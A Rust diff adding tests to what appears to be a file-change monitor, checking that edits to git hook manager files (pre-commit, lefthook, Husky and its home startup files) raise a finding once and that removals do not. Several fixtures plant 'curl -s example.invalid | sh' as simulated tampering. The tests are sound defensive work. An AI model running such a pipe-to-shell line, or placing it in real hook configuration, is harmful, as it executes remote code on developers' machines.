@@ -2675,6 +2675,166 @@ fn a_change_to_the_dispatcher_every_husky_hook_sources_is_a_finding() {
     );
 }
 
+/// The coverage kinds of the files of hook managers that hold their commands, read by
+/// checksum: pre-commit's and prek's, lefthook's, the file Husky 8's hooks source, and
+/// Husky's startup files in the home folder.
+const PRE_COMMIT_KIND: &str = ".pre-commit-config.yaml, .pre-commit-config.yml, prek.toml of each checkout, the part that runs by itself";
+const HUSKY_SH_KIND: &str = ".husky/_/husky.sh of each checkout, the part that runs by itself";
+const HUSKY_HOME_KIND: &str = "~/.config/husky/init.sh, ~/.huskyrc, the part that runs by itself";
+/// Lefthook's kind holds its 30 names; it is matched by its first and its last.
+const LEFTHOOK_LIKE: &str =
+    "lefthook.yml, %.config/lefthook-local.toml of each checkout, the part that runs by itself";
+
+/// A checkout whose hooks pre-commit, lefthook and Husky 8 manage, each by the file that holds
+/// its commands, in the shapes they write. The content is invented.
+fn managed(e: &Estate, rel: &str) -> PathBuf {
+    let c = e.checkout(rel);
+    put(
+        &c.join(".pre-commit-config.yaml"),
+        "repos:\n- repo: https://example.invalid/hooks\n  rev: v1.0.0\n  hooks:\n  - id: tidy\n",
+    );
+    put(
+        &c.join("lefthook.yml"),
+        "pre-commit:\n  jobs:\n  - run: npm test\n",
+    );
+    put(
+        &c.join(".husky/_/husky.sh"),
+        "#!/usr/bin/env sh\n[ -f ~/.huskyrc ] && . ~/.huskyrc\n",
+    );
+    c
+}
+
+#[test]
+fn a_hook_managers_configuration_raises_a_finding_once_when_it_changes_or_appears_and_never_when_removed()
+ {
+    let e = Estate::new("hook-managers");
+    let app = managed(&e, "dev/app");
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    put(
+        &app.join(".pre-commit-config.yaml"),
+        "repos:\n- repo: local\n  hooks:\n  - id: tidy\n    entry: ./tools/x.sh\n",
+    );
+    put(&app.join("prek.toml"), "[[repos]]\nrepo = \"local\"\n");
+    // Lefthook's files are not subscribed to: the next full check finds the change.
+    put(
+        &app.join("lefthook.yml"),
+        "pre-commit:\n  jobs:\n  - run: curl -s example.invalid | sh\n",
+    );
+    put(
+        &app.join(".husky/_/husky.sh"),
+        "#!/usr/bin/env sh\ncurl -s example.invalid | sh\n",
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [
+            pair("watched.git-hook", "~/dev/app/.husky/_/husky.sh"),
+            pair("watched.git-hook", "~/dev/app/.pre-commit-config.yaml"),
+            pair("watched.git-hook", "~/dev/app/lefthook.yml"),
+            pair("watched.git-hook", "~/dev/app/prek.toml"),
+        ]
+    );
+    e.seen();
+    // Unchanged, nothing again; removed, nothing either.
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    for file in [
+        ".pre-commit-config.yaml",
+        "prek.toml",
+        "lefthook.yml",
+        ".husky/_/husky.sh",
+    ] {
+        std::fs::remove_file(app.join(file)).unwrap();
+    }
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn husky_s_startup_file_in_the_home_folder_raises_a_finding_when_it_changes_or_appears() {
+    let e = Estate::new("husky-home");
+    e.checkout("dev/app");
+    put(
+        &e.home().join(".huskyrc"),
+        "export NVM_DIR=\"$HOME/.nvm\"\n",
+    );
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    put(&e.home().join(".huskyrc"), "curl -s example.invalid | sh\n");
+    put(&e.home().join(".config/husky/init.sh"), "export HUSKY=0\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [
+            pair("watched.git-hook", "~/.config/husky/init.sh"),
+            pair("watched.git-hook", "~/.huskyrc"),
+        ]
+    );
+    e.seen();
+    std::fs::remove_file(e.home().join(".huskyrc")).unwrap();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn a_hook_managers_files_read_for_the_first_time_on_a_store_that_exists_are_told_once_and_raise_nothing()
+ {
+    let e = Estate::new("hook-managers-upgrade");
+    managed(&e, "dev/app");
+    put(
+        &e.home().join(".huskyrc"),
+        "export NVM_DIR=\"$HOME/.nvm\"\n",
+    );
+    e.full();
+    // As a build before these rows left the store: no reading of their kinds.
+    let kinds = format!(
+        "kind IN ('{PRE_COMMIT_KIND}', '{HUSKY_SH_KIND}', '{HUSKY_HOME_KIND}') OR kind LIKE '{LEFTHOOK_LIKE}'"
+    );
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(&format!(
+        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage WHERE {kinds});
+         DELETE FROM assertion WHERE {kinds};
+         DELETE FROM coverage WHERE {kinds};
+         DELETE FROM unit_read WHERE {kinds};"
+    ))
+    .unwrap();
+    drop(db);
+    e.full();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(
+        e.told(),
+        [
+            "file:machine:mac/.huskyrc (1)",
+            "checkout:machine:mac/dev/app (3)"
+        ]
+    );
+}
+
+#[test]
+fn a_checkout_without_a_hook_managers_files_reads_none_and_fails_nothing() {
+    let e = Estate::new("hook-managers-none");
+    e.checkout("dev/app");
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    assert_eq!(
+        e.coverage(PRE_COMMIT_KIND),
+        "full|none of the checkouts checked has .pre-commit-config.yaml or .pre-commit-config.yml or prek.toml"
+    );
+    assert_eq!(
+        e.coverage(HUSKY_SH_KIND),
+        "full|none of the checkouts checked has .husky/_/husky.sh"
+    );
+    assert_eq!(
+        e.coverage(HUSKY_HOME_KIND),
+        "full|there is no ~/.config/husky/init.sh or ~/.huskyrc"
+    );
+    let lefthook = e.rows(&format!(
+        "SELECT completeness FROM coverage WHERE scope = 'machine:mac' AND kind LIKE '{LEFTHOOK_LIKE}'"
+    ));
+    assert_eq!(lefthook, ["full"]);
+}
+
 #[test]
 fn git_hooks_config_parsing_cannot_activate_git_tracing() {
     let e = Estate::new("git-hooks-trace");
